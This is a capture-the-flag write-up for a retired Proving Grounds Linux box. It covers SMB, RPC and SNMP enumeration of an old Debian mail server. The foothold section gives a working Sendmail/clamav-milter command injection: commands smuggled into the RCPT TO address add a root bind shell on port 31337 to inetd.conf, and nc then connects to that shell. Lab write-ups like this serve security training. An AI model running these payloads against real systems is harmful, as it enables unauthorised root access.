---
machine: ClamAV
platform: Proving Grounds
category: Linux
difficulty: Easy
tags: [samba, snmp, sendmail, clamav-milter, inetd, rce]
date: 2026-07-20
status: retired
summary: An aging Debian box running a mail stack alongside Samba and SNMP — testing null-session SMB and community-string SNMP enumeration to fingerprint running services, then a known remote command execution vulnerability in a mail-filtering daemon reachable through crafted SMTP envelope fields.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ nmap-full 192.168.125.42
[*] Running fast port discovery on 192.168.125.42...
[sudo] password for kali: 
[*] Open ports: 22,25,80,139,199,445,60000
[*] Running full scan on 192.168.125.42...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 10:40 -0400
Nmap scan report for 192.168.125.42
Host is up (0.032s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.225], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 6h00m01s, deviation: 2h49m42s, median: 4h00m01s
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-20T14:41:10-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.68 seconds

```

We find some interesting services: SMTP, a webapp, and a samba share.

We can run [[enum4linux]] to see what it can enumerate from the samba share

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ enum4linux -a 192.168.125.42
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul 20 10:43:48 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.125.42
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.125.42 )===========================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                                           
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 ===============================( Nbtstat Information for 192.168.125.42 )===============================
                                                                                                                                                                                                                   
Looking up status of 192.168.125.42                                                                                                                                                                                
        0XBABE          <00> -         B <ACTIVE>  Workstation Service
        0XBABE          <03> -         B <ACTIVE>  Messenger Service
        0XBABE          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.125.42 )==================================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Server 192.168.125.42 allows sessions using username '', password ''                                                                                                                                           
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 ===============================( Getting domain SID for 192.168.125.42 )===============================
                                                                                                                                                                                                                   
Domain Name: WORKGROUP                                                                                                                                                                                             
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                               
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 ==================================( OS information on 192.168.125.42 )==================================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[E] Can't get OS info with smbclient                                                                                                                                                                               
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Got OS info for 192.168.125.42 from srvinfo:                                                                                                                                                                   
        0XBABE         Wk Sv PrQ Unx NT SNT 0xbabe server (Samba 3.0.14a-Debian) brave pig                                                                                                                         
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 ======================================( Users on 192.168.125.42 )======================================
                                                                                                                                                                                                                   
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                                                                                                               
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x4 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x5 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x6 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0x7 RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0x8 RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0x9 RID: 0x3ea acb: 0x00000011 Account: daemon   Name: daemon    Desc: (null)
index: 0xa RID: 0xbb8 acb: 0x00000011 Account: ryu      Name: ryu,,,    Desc: (null)
index: 0xb RID: 0x3f4 acb: 0x00000011 Account: man      Name: man       Desc: (null)
index: 0xc RID: 0x3f6 acb: 0x00000011 Account: lp       Name: lp        Desc: (null)
index: 0xd RID: 0x4b4 acb: 0x00000011 Account: Debian-exim      Name: (null)    Desc: (null)
index: 0xe RID: 0x43a acb: 0x00000011 Account: gnats    Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0xf RID: 0x42c acb: 0x00000011 Account: backup   Name: backup    Desc: (null)
index: 0x10 RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x11 RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x12 RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x13 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x14 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[proxy] rid:[0x402]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[daemon] rid:[0x3ea]
user:[ryu] rid:[0xbb8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[Debian-exim] rid:[0x4b4]
user:[gnats] rid:[0x43a]
user:[backup] rid:[0x42c]
user:[sys] rid:[0x3ee]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 ================================( Share Enumeration on 192.168.125.42 )================================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE

[+] Attempting to map shares on 192.168.125.42                                                                                                                                                                     
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[E] Can't understand response:                                                                                                                                                                                     
                                                                                                                                                                                                                   
tree connect failed: NT_STATUS_WRONG_PASSWORD                                                                                                                                                                      
//192.168.125.42/print$ Mapping: N/A Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                     
                                                                                                                                                                                                                   
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                                                                                                                                         
//192.168.125.42/IPC$   Mapping: N/A Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                     
                                                                                                                                                                                                                   
tree connect failed: NT_STATUS_WRONG_PASSWORD                                                                                                                                                                      
//192.168.125.42/ADMIN$ Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.125.42 )===========================
                                                                                                                                                                                                                   
Password:                                                                                                                                                                                                          


[+] Attaching to 192.168.125.42 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] 0XBABE
        [+] Builtin

[+] Password Info for Domain: 0XBABE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                                                                               
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Password Complexity: Disabled                                                                                                                                                                                      
Minimum Password Length: 0


 ======================================( Groups on 192.168.125.42 )======================================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Getting builtin groups:                                                                                                                                                                                        
                                                                                                                                                                                                                   
group:[System Operators] rid:[0x225]                                                                                                                                                                               
group:[Replicators] rid:[0x228]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Print Operators] rid:[0x226]
group:[Administrators] rid:[0x220]
group:[Account Operators] rid:[0x224]
group:[Backup Operators] rid:[0x227]
group:[Users] rid:[0x221]

[+]  Getting builtin group memberships:                                                                                                                                                                            
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+]  Getting local groups:                                                                                                                                                                                         
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+]  Getting local group memberships:                                                                                                                                                                              
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+]  Getting domain groups:                                                                                                                                                                                        
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+]  Getting domain group memberships:                                                                                                                                                                             
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 =================( Users on 192.168.125.42 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[I] Found new SID:                                                                                                                                                                                                 
S-1-5-21-1974239401-1762029558-4115558683                                                                                                                                                                          

[+] Enumerating users using SID S-1-5-21-1974239401-1762029558-4115558683 and logon username '', password ''                                                                                                       
                                                                                                                                                                                                                   
S-1-5-21-1974239401-1762029558-4115558683-500 0XBABE\Administrator (Local User)                                                                                                                                    
S-1-5-21-1974239401-1762029558-4115558683-501 0XBABE\nobody (Local User)
S-1-5-21-1974239401-1762029558-4115558683-512 0XBABE\Domain Admins (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-513 0XBABE\Domain Users (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-514 0XBABE\Domain Guests (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1000 0XBABE\root (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1001 0XBABE\root (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1002 0XBABE\daemon (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1003 0XBABE\daemon (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1004 0XBABE\bin (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1005 0XBABE\bin (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1006 0XBABE\sys (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1007 0XBABE\sys (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1008 0XBABE\sync (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1009 0XBABE\adm (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1010 0XBABE\games (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1011 0XBABE\tty (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1012 0XBABE\man (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1013 0XBABE\disk (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1014 0XBABE\lp (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1015 0XBABE\lp (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1016 0XBABE\mail (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1017 0XBABE\mail (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1018 0XBABE\news (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1019 0XBABE\news (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1020 0XBABE\uucp (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1021 0XBABE\uucp (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1025 0XBABE\man (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1026 0XBABE\proxy (Local User)
S-1-5-21-1974239401-1762029558-4115558683-1027 0XBABE\proxy (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1031 0XBABE\kmem (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1041 0XBABE\dialout (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1043 0XBABE\fax (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1045 0XBABE\voice (Domain Group)
S-1-5-21-1974239401-1762029558-4115558683-1049 0XBABE\cdrom (Domain Group)

 ==============================( Getting printer info for 192.168.125.42 )==============================
                                                                                                                                                                                                                   
No printers returned.                                                                                                                                                                                              


enum4linux complete on Mon Jul 20 10:47:27 2026


```

If we scan UDP port 161, we will also see SNMP is running:

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ nmap -sU -sV -p 161,162 192.168.125.42
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 10:52 -0400
Nmap scan report for target (192.168.125.42)
Host is up (0.032s latency).

PORT    STATE  SERVICE  VERSION
161/udp open   snmp     SNMPv1 server; U.C. Davis, ECE Dept. Tom SNMPv3 server (public)
162/udp closed snmptrap
Service Info: Host: 0xbabe.local

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

On the webapp we have binary that translates to "ifyoudontpwnmeuran00b"

I attempt rpcclient and see that it works with anonymous logon for certain commands and we are able to enumerate users and the srvinfo:

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ rpcclient -U="" 192.168.125.42
Password for [WORKGROUP\]:
rpcclient $> enumdomusers
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[proxy] rid:[0x402]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[daemon] rid:[0x3ea]
user:[ryu] rid:[0xbb8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[Debian-exim] rid:[0x4b4]
user:[gnats] rid:[0x43a]
user:[backup] rid:[0x42c]
user:[sys] rid:[0x3ee]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
rpcclient $> srvinfo
        0XBABE         Wk Sv PrQ Unx NT SNT 0xbabe server (Samba 3.0.14a-Debian) brave pig
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03
```

Next we can use [[snmp-check]] to enumerate running processes in a user friendly way:

```bash
(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ snmp-check 192.168.125.42                           
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.125.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.125.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:24:38.90
  Uptime system                 : 00:24:02.16
  System date                   : 2026-7-20 15:01:55.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 68567
  TCP segments sent             : 68004
  TCP segments retrans          : 0
  Input datagrams               : 69555
  Delivered datagrams           : 69553
  Output datagrams              : 68868

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:86:28:f6
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 4698845
  Out octets                    : 4374078

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:28:f6
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.125.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.125.254       0.0.0.0               1                   
  192.168.125.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  192.168.125.42        445                   192.168.45.225        47422                 established         

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  127.0.0.1             32780               
  192.168.125.42        137                 
  192.168.125.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3768                  running               syslogd               /sbin/syslogd                             
  3771                  runnable              klogd                 /sbin/klogd                               
  3775                  runnable              clamd                 /usr/local/sbin/clamd                      
  3778                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3787                  runnable              inetd                 /usr/sbin/inetd                           
  3791                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3793                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3797                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3803                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3804                  runnable              sshd                  /usr/sbin/sshd                            
  3882                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
  3896                  runnable              atd                   /usr/sbin/atd                             
  3899                  runnable              cron                  /usr/sbin/cron                            
  3906                  runnable              apache                /usr/sbin/apache                          
  3907                  runnable              apache                /usr/sbin/apache                          
  3912                  runnable              apache                /usr/sbin/apache                          
  3913                  runnable              apache                /usr/sbin/apache                          
  3914                  runnable              apache                /usr/sbin/apache                          
  3926                  runnable              getty                 /sbin/getty           38400 tty1          
  3932                  runnable              getty                 /sbin/getty           38400 tty2          
  3933                  runnable              getty                 /sbin/getty           38400 tty3          
  3934                  runnable              getty                 /sbin/getty           38400 tty4          
  3935                  runnable              getty                 /sbin/getty           38400 tty5          
  3936                  runnable              getty                 /sbin/getty           38400 tty6          
  3965                  runnable              apache                /usr/sbin/apache                          
  4020                  runnable              apache                /usr/sbin/apache                          
  4037                  runnable              apache                /usr/sbin/apache                          
  4306                  runnable              smbd                  /usr/sbin/smbd        -D                  

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x00007f4131dbe8a8 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f4131dbcf30 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 116.79 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x00007f4131db8660 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f4131db6ce8 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x00007f4131db25f8 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f4131db0c80 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 765.73 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x00007f4131e0c418 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f4131e0aa00 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr               
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7413 24-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor

```

We see a service clamav-milter running with blackhole args. If we lookup this service in searchploit we will find an RCE exploit associated with it we can attempt:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ searchsploit clamav-milter
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                                                                                  | multiple/remote/4761.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## Foothold

After reading the exploit we can see that its RCE via the forwarding name+"|rcehere"@domain.com field, so we manually exploit it by editing the inetd conf to open an interact root shell on port 31337 and then restarting the service to spawn the bind shell:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ rlwrap -cAr nc 192.168.125.42 25
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 20 Jul 2026 15:35:51 -0400; (No UCE/UBE) logging access from: [192.168.45.225](FAIL)-[192.168.45.225]
ehlo you
250-localhost.localdomain Hello [192.168.45.225], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
mail from: <>
250 2.1.0 <>... Sender ok
rcpt to: <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>... Recipient ok
rcpt to: <nobody+"|/etc/init.d/inetd restart"@localhost>
250 2.1.5 <nobody+"|/etc/init.d/inetd restart"@localhost>... Recipient ok
data
354 Enter mail, end with "." on a line by itself
.
250 2.0.0 66KJZphf004434 Message accepted for delivery
quit
221 2.0.0 localhost.localdomain closing connection
```

```bash
──(kali㉿kali)-[192.168.45.225]-[~/oscp/clamav]
└─$ nc 192.168.125.42 31337
whoami
root
```

From here we can get the root flag from /root/
